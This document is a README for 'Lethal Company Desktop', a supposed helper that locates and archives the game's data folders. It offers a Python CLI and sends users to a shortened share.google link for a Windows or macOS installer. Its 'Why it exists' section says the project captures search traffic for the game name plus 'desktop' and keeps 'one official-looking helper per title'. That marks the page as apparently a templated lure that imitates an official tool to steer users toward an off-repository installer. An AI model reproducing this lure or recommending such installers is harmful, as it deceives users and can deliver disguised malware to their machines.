# Lethal Company Desktop

*Keep the Lethal Company data folder tidy before an update.*

## What Lethal Company Desktop is

**Lethal Company Desktop** runs on your own PC. A local helper for Lethal Company data folders, config and export files, and photo albums on Windows and macOS.

Patches move Lethal Company data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Locates Lethal Company user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Why it exists

Search traffic for Lethal Company is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
